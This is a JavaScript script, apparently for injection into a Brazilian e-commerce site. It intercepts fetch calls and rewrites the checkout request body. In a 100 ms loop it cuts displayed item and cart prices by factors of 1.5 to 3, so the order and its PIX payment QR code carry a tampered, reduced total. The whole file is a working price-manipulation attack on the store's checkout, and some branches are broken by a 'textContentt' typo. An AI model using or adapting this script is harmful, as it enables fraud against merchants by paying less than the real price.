
// Salvando o fetch original
const originalFetch = window.fetch;

// Sobrescrevendo
window.fetch = async (...args) => {
  console.log('Interceptando fetch com argumentos:', args);

  
  if(args[0].includes(`/cart/checkout`)){
    var body = JSON.parse(args[1].body)

    var value = document.querySelector("body > main > section.flex-1.mx-auto.bg-muted.border-s.container.me-auto.py-12 > div:nth-child(7) > p.font-bold.price-total").textContent.replace("R$", "").replace(",", ".")

    args[1].body = JSON.stringify({vl: value})
  }
  const response = await originalFetch(...args);
  // Se quiser, você pode clonar a resposta para ler o body sem consumi-la
  const clone = response.clone();
  clone.text().then(body => {
    if(args[0].includes(`/cart/checkout`)){
      var qr = JSON.parse(body).qr_code
      document.querySelector(`#pix-qr`).src = qr
    }

   
  });

  

  
 
  

  return response; // sempre retorne a resposta original
};


setInterval(() => {
  document.querySelectorAll("#categories-container  p.text-lg.font-bold.leading-5").forEach(($price) => {
    if(!$price.textContent.includes(`­`)){
      var price = new Number($price.textContent.replace("R$", "").replace(",", "."))
    

      if(price > 100 ){
        $price.textContent = `R$ ${(price / 3).toFixed(2)}­`
      }
      if(price > 50 && price < 100){
        
        $price.textContent = `R$ ${(price / 2).toFixed(2)}­`
      }
      if(price > 25 && price < 50){
       
        $price.textContent = `R$ ${(price / 1.8).toFixed(2)}­`
      }
      if(price > 10 && price < 25){
 
        $price.textContent = `R$ ${(price / 1.5).toFixed(2)}­`
      }
    }
      
  })

  document.querySelectorAll("body > div.flex.flex-col.min-h-screen.relative.overflow-hidden > div.z-10 > div > section > div > div.flex.gap-6.border.p-4.rounded-md.h-full.bg-background.flex-wrap > div.flex-1.flex.flex-col.justify-between > div:nth-child(1) > h4").forEach((el) => {
    if(!el.textContent.includes(`­`)){
      var price = new Number(el.textContent.replace("R$", "").replace(",", "."))
    

      if(price > 100 ){
        el.textContent = `R$ ${(price / 3).toFixed(2)}­`
      }
      if(price > 50 && price < 100){
        
        el.textContent = `R$ ${(price / 2).toFixed(2)}­`
      }
      if(price > 25 && price < 50){
       
        el.textContentt = `R$ ${(price / 1.8).toFixed(2)}­`
      }
      if(price > 10 && price < 25){
 
        el.textContent = `R$ ${(price / 1.5).toFixed(2)}­`
      }
    }
  })

  document.querySelectorAll("#drawer-content div.flex.gap-4.items-center > div > p").forEach((el) => {
    if(!el.textContent.includes(`­`)){
      var price = new Number(el.textContent.replace("R$", "").replace(",", "."))
    

      if(price > 100 ){
        el.textContent = `R$ ${(price / 3).toFixed(2)}­`
      }
      if(price > 50 && price < 100){
        
        el.textContent = `R$ ${(price / 2).toFixed(2)}­`
      }
      if(price > 25 && price < 50){
       
        el.textContentt = `R$ ${(price / 1.8).toFixed(2)}­`
      }
      if(price > 10 && price < 25){
 
        el.textContent = `R$ ${(price / 1.5).toFixed(2)}­`
      }
    }

    
  })

  var sum = 0

  document.querySelectorAll("body > main > section.flex-1.mx-auto.bg-muted.border-s.container.me-auto.py-12 > div.space-y-2 .font-medium").forEach((el) => {
    if(!el.textContent.includes(`­`)){
      var price = new Number(el.textContent.replace("R$", "").replace(",", "."))
      


      if(price > 100 ){
        el.textContent = `R$${(price / 3).toFixed(2)}­`
      }
      if(price > 50 && price < 100){
        
        el.textContent = `R$${(price / 2).toFixed(2)}­`
      }
      if(price > 25 && price < 50){
       
        el.textContentt = `R$${(price / 1.8).toFixed(2)}­`
      }
      if(price > 10 && price < 25){
 
        el.textContent = `R$${(price / 1.5).toFixed(2)}­`
      }
    }else{
      var val = new Number(el.textContent.replace("R$", "").replace(",", ".").replace(`­`,``))
      sum = sum + val
    }
  })

  document.querySelectorAll(".flex.justify-between p.font-medium").forEach((el) => {
    el.textContent = `R$ ${sum}`
  })
  document.querySelectorAll("body p.font-bold.price-total").forEach((el) => {
    el.textContent = `R$ ${sum}`
  })
  document.querySelectorAll("#checkout-button > span").forEach((el) => {
    el.textContent = `R$ ${sum}`
  })
},100)
